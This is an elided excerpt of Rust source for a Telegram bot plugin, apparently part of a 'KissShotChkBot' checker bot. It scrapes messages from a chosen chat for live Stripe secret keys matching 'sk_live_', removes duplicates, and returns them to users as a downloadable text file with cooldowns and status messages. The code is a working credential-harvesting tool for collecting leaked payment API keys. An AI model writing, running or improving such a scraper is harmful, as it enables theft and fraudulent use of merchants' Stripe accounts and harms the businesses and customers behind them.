    ...
    static ref LOGGER: std::sync::Arc<LoggerHandle> = {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async {
                get_logger("SkScraperPlugin").await
            })
        })
    };
...
#[TeloxidePlugin(commands = ["skscr", "skscr@KissShotChkBot", "scrsk", "scrsk@KissShotChkBot"])]
pub struct SkScraperPlugin;
impl SkScraperPlugin {
    pub async fn handle(&self, bot: &Bot, message: &Message, msg: &str) {
        ...
        let task_handle = task::spawn_blocking(move || {
            futures::executor::block_on(Self::sk_scraper(&bot_clone, &message_clone, &msg_clone))
        });
        tokio::select! {
            result = task_handle => {
                if let Err(e) = result {
                    ...
                    let reply = format!(
                        "<b>Stripe Key Scraping Failed ❌</b>\n\n\
            ...
            _ = tokio::time::sleep(Duration::from_secs(300)) => {
                LOGGER.error("❌ Scraping task timed out after 5 minutes").await;
                let reply = format!(
                    "<b>Stripe Key Scraping Failed ❌</b>\n\n\
                     <b>Reason:</b> Task timed out (5 minutes).\n\
                     <b>Timestamp:</b> {}",
                    Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
                );
                let _ = bot_timeout.edit_message_text(message_timeout.chat.id, message_timeout.id, reply)
    ...
    pub async fn sk_scraper(bot: &Bot, message: &Message, msg: &str) {
        ...
        if command_parts.len() <= 1 {
            let reply = format!(
                "<b>Stripe Key Scraping Failed ❌</b>\n\n\
                 <b>Reason:</b> You need to specify a chat_id to scrape Stripe keys.\n\
                 <b>Example:</b> <code>/sk_scr fpsv2 100</code>\n\
                 <b>Timestamp:</b> {}",
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
        ...
        let limit = command_parts[1].parse::<i32>().unwrap_or(100);
        let user = match fetch_user(user_id).await {
            Ok(user) => user,
            Err(e) => {
                LOGGER
                    .error(&format!("❌ Failed to fetch user {}: {}", user_id, e))
                    .await;
                let reply = format!(
                    "<b>Stripe Key Scraping Failed ❌</b>\n\n\
                     <b>Reason:</b> Database connection failed.\n\
                     <b>Timestamp:</b> {}",
                    timestamp
                );
                let _ = bot
                    .edit_message_text(message.chat.id, sent_msg.id, reply)
                    .parse_mode(ParseMode::Html)
                    .await;
        ...
        bot.edit_message_text(
            ...
            sent_msg.id,
            format!(
                "<b>Stripe Key Scraping Processing...</b>\n\n\
                 <b>Requested Amount:</b> <code>{}</code>\n\
                 <b>Target Chat:</b> <code>{}</code>\n\
                 <b>Timestamp:</b> {}",
                chat_title, limit, timestamp
            ),
        )
        .parse_mode(ParseMode::Html)
        .await
        ...
        let (total_found, unique_keys) = {
            ...
            let sk_regex = match Regex::new(r"sk_live_\S+") {
                Ok(regex) => regex,
                Err(e) => {
                    LOGGER
                    ...
                    for message in messages.messages {
                        if let tl::enums::Message::Message(msg) = message {
                            ...
                            for line in text.lines() {
                                if let Some(mat) = sk_regex.find(line) {
                                    let sk_key = mat.as_str().to_string();
                                    total_found += 1;
                                    keys_set.insert(sk_key);
                                }
                            }
                        }
                    }
            ...
            (total_found, keys_set.into_iter().collect::<Vec<String>>())
        };
        SCRAPE_QUEUE.fetch_sub(1, Ordering::SeqCst);
        if total_found == 0 {
            let reply = format!(
                "<b>Stripe Key Scraping Information ℹ️</b>\n\n\
                 <b>Reason:</b> No Stripe keys were found.\n\
                 <b>Timestamp:</b> {}",
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
        ...
        {
            let filename = format!("x{}_Scrapped_Stripe_Keys.txt", unique_count);
            ...
            if let Err(e) = file.write_all(unique_keys.join("\n").as_bytes()).await {
                LOGGER
            ...
            let caption = format!(
                "<b>Stripe Key Scraping Successful ✅</b>\n\n\
                 <b>Requested Amount:</b> <code>{}</code>\n\n\
                 <b>Scrape Target Chat:</b> <code>{}</code>\n\
                 <b>Stripe Keys Found:</b> <code>{}</code>\n\
                 <b>Unique Stripe Keys:</b> <code>{}</code>\n\
                ...
                .await
            {
                Ok(_) => {
                    ...
                    LOGGER
                        .info(&format!(
                            "✅ Stripe Key Scraping Successful: {} total, {} unique, {} duplicates",
                    ...
                    LOGGER
                        .info(&format!(
                            "User {} used SK scraper successfully. Cooldown: {}s, Remaining: {}s",
